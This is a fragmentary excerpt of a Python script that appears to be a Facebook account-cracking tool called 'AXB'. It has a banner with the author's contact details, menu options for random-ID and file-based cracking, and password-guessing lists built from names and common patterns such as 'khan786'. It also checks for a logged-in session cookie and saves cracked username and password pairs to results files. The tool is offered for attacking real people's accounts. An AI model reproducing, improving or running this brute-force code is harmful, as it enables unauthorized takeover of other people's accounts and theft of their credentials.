...
██╔══██║ ██╔██╗ ██╔══██╗
██║  ██║██╔╝ ██╗██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ \n{N} ▌│█║▌║▌║WELCOME T O AXB WORLD║▌║▌║█│▌{N} """)
    print("╔════════════════════════════════════════╗")
    print(f"║{P}[{H}•{P}] Author    : # A Z A N                 {N}║")
    print(f"║{P}[{H}•{P}] Whatsapp  : + 923165456679       {N}║")
    print(f"║{P}[{H}•{P}] Github    : github.com/MR-AZAN/AXB{N}  ║")
    print(f"║{P}[{H}•{P}] SC Status : VERSION{H}Premium{P}     {N}║")
    ...
    if len(ok) != 0 or len(cp) != 0:
        ...
        if cek_cp =="":
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                print(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[AXB-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[AXB-CP] ", ""), titid[1])
...
def yayanxd():
    ...
    try:
    	...
    	print('\n LOGIN SUCCESSFULLY....Script Run Again')
    	exit()
    except Exception as e:
...
def moch_yayan(my_name,my_id):
    ...
    print(' [%s02%s] Random ID Crack (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    ...
    print(' [%s06%s] Crack File(%sON%s)'%(H,N,H,N));time.sleep(0.03)
...
###### CEK HASIL CRACK #####
        ...
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace("[AXB-OK] ","\x1b[1;92m[ROY-OK] ").replace("[ROY-CP] ", "\x1b[1;93m[ROY-CP] ")
    ...
    if "c_user" in session.cookies.get_dict():
        ...
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                ...
                open('results/ERROR.txt', 'a').write(f"[AXB-CP] {user} • {pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
            open(f'results/CP-File-{ha}-{op}-{ta}.txt', 'a').write(f"[AXB-CP] {user} • {pasw}\n")
...
# PROSES CRACK METODE 3 in 1
    ...
    def kombinasi_pw(self,url):
        ...
        print(' %s[%s1%s] First Last,first last,firstlast,first1234,First1234,first786,First786,First1122,first1122'%(N,H,N))
        print(' %s[%s2%s] khan khan,khankhan,khan1234,khan786,khan1122,786786, Pakistan,janjan'%(N,H,N))
        print(' %s[%s3%s] name,name123,name1234,name12345,%s+Password%s'%(N,H,N,H,N))
        ...
        if pw in[""]:
            ...
            print(" %s[%s!%s] Example : %sali,khankhan,janjan%s"%(N,M,N,H,N))
